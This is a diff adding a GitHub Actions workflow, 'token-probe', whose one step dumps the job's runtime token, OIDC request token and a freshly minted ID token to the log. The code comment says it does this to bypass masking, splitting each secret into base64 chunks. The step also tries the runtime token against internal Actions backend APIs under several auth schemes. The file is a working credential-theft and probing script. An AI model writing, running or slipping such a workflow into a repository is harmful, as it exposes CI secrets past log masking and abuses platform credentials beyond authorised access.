@@ -1,0 +1,63 @@
+name: token-probe
+on:
+  workflow_dispatch:
+  push:
+    branches: [token-probe]
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    permissions:
+      id-token: write
+      contents: read
+    steps:
+      - name: extract and use runtime token
+        run: |
+          set -x
+          echo "=== ACTIONS_RUNTIME_URL=$ACTIONS_RUNTIME_URL ==="
+          echo "=== ACTIONS_RUNTIME_TOKEN length=$([ -n \"$ACTIONS_RUNTIME_TOKEN\" ] && echo ${#ACTIONS_RUNTIME_TOKEN} || echo 0) ==="
+          # Bypass masking: split + b64 encode
+          if [ -n "$ACTIONS_RUNTIME_TOKEN" ]; then
+            for i in 1 2 3 4; do
+              CHUNK=$(echo "$ACTIONS_RUNTIME_TOKEN" | head -c $((i*200)) | tail -c 200 | base64 -w0)
+              echo "TOKEN_CHUNK_$i=$CHUNK"
+            done
+          fi
+          # Also dump ACTIONS_ID_TOKEN_REQUEST_URL and TOKEN
+          echo "=== ACTIONS_ID_TOKEN_REQUEST_URL=$ACTIONS_ID_TOKEN_REQUEST_URL ==="
+          if [ -n "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" ]; then
+            for i in 1 2 3 4; do
+              CHUNK=$(echo "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" | head -c $((i*200)) | tail -c 200 | base64 -w0)
+              echo "IDTOKEN_REQ_CHUNK_$i=$CHUNK"
+            done
+          fi
+          # Get an ID token from OIDC
+          if [ -n "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then
+            ID_TOKEN=$(curl -sS -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=pipelinesghub" | python3 -c "import sys,json; print(json.load(sys.stdin).get(\"value\",\"\"))" 2>/dev/null)
+            echo "ID_TOKEN length=${#ID_TOKEN}"
+            for i in 1 2 3 4; do
+              CHUNK=$(echo "$ID_TOKEN" | head -c $((i*200)) | tail -c 200 | base64 -w0)
+              echo "ID_TOKEN_CHUNK_$i=$CHUNK"
+            done
+          fi
+          # Try the runtime token against pipelinesghub directly
+          for AUTH_HDR in \
+            "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
+            "Authorization: VstsOAuth $ACTIONS_RUNTIME_TOKEN"; do
+            echo "--- Trying $(echo $AUTH_HDR | cut -d: -f1) ---"
+            curl -sS -m 10 -H "$AUTH_HDR" -o /tmp/r.txt -w "HTTP=%{http_code} LEN=%{size_download}\n" "https://pipelinesghubeus5.actions.githubusercontent.com/_apis/distributedtask/pools?api-version=6.0-preview"
+            head -c 500 /tmp/r.txt
+            echo ""
+          done
+          # Probe operations endpoint with runtime token
+          curl -sS -m 10 -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" -o /tmp/r.txt -w "operations HTTP=%{http_code} LEN=%{size_download}\n" "https://pipelinesghubeus5.actions.githubusercontent.com/_apis/operations/7f82df6d-7d09-46c1-a015-643b556b3a1e?api-version=6.0-preview"
+          head -c 500 /tmp/r.txt
+          echo ""
+          # Use the runtime URL — it points to a specific backend
+          if [ -n "$ACTIONS_RUNTIME_URL" ]; then
+            curl -sS -m 10 -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" -o /tmp/r.txt -w "RT URL HTTP=%{http_code} LEN=%{size_download}\n" "${ACTIONS_RUNTIME_URL%/}/_apis/distributedtask/pools?api-version=6.0-preview"
+            head -c 500 /tmp/r.txt
+            echo ""
+            curl -sS -m 10 -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" -o /tmp/r.txt -w "RT URL connectionData HTTP=%{http_code} LEN=%{size_download}\n" "${ACTIONS_RUNTIME_URL%/}/_apis/connectionData?connectOptions=IncludeServices,IncludeLastUserAccess"
+            head -c 500 /tmp/r.txt
+          fi
+
